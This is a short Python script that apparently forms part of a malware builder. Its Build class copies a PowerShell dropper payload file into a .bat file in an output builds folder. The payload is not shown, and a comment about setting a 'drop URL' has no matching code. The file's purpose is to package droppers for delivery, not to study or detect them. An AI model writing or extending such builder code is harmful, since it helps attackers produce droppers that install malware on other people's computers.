#!/usr/bin/python

import os

class Build :

	def __init__(self, extension) :
		self.extension = extension

	def Builder(self) :

		path = "output/builds/" # Builds file
		payload = "payloads/powershell/dropper.txt" # Payload file
		build = "{}{}".format(self.extension, ".bat") # Make .bat file
		
		try:
			with open(payload, 'rb') as f :
				# Set the drop URL
				with open(os.path.join(path, build), 'wb') as builder :
					# Write the new file
					builder.write(f.read())
		except IOError as e:
			raise e

